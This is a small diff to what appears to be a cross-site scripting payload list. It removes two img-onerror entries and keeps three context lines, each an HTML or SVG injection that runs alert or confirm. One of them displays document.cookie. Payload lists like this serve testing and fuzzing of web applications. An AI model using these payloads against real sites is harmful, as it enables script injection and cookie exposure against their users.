@@ -1,5 +1,3 @@
-a:'"/>a"><aa"><img src=x onerror=alert()>
-a:"/>a"><aa"><img src=x onerror=alert()>
 <Svg Only=1 OnLoad=confirm(1)>
 ">test<svg/onload=alert(document.cookie)>
 xhzeem"on onmouseover=(alert)(document.domain)//
